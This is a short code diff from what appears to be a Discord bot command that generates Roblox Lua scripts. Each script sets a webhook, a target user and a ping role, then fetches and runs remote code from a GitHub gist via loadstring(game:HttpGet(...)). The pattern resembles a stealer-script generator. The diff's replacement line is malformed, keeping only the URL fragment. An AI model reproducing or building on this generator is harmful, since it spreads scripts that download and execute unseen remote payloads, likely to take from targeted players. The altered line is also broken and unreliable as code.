@@ -54,7 +54,7 @@ export async function execute(interaction) {
 _G.YOUR_WEBHOOK = '${webhook}'
 _G.TARGET_USER = '${target}'
 _G.PING_ROLE_ID = '${pingRole}'
-loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/a7348c340afc847b43c20e09bf78d445/raw/cd242a9edf1d021d926dd1ab65780a67104d6b5b/ANTIWARES', true))()
+https://gist.githubusercontent.com/malik020859-ui/ff9a2485ae183418a8af418a2dbf9e11/raw/316b8d58ced9b8080886a8551eb9bad7750de3ce/ANTIWARES', true))()
 `;
 
   await submitted.deferReply();
